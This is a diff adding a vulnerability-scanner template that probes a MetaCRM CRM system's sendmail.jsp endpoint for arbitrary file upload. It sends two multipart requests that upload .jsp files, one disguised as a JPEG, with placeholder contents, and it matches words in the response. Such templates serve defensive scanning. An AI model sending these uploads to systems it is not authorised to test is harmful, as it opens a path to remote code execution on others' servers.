@@ -1,0 +1,62 @@
+id: MetaCRM-sendmail-upload
+
+info:
+  name: MetaCRM美特crm系统sendmail.jsp接口存在任意文件上传漏洞
+  author: MetaCRM
+  severity: high
+  tags: MetaCRM
+
+http:
+  - raw:
+      - |
+        POST /business/ums/sendmail.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="147258.jsp"
+        Content-Type: image/jpeg
+
+        tettest
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |
+        POST /business/ums/sendmail.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 466
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="touser"
+
+        aa@qq.com
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="subject"
+
+        test
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="discerptesend"
+
+        test
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="body"
+
+        test
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="cc471.jsp"
+
+        UPLOAD_TEST
+        ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "正在发送"
+          - "userfile"
+          - "default"
+        part: body
+        condition: and
